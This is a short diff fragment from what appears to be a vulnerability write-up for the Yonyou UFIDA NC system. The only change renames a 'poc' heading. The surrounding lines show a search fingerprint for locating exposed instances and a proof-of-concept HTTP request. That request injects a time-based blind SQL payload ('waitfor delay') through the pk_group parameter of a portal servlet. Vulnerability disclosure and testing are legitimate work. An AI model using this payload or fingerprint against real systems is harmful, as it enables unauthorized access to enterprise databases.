@@ -8,7 +8,7 @@
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 
 ```
 GET /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1
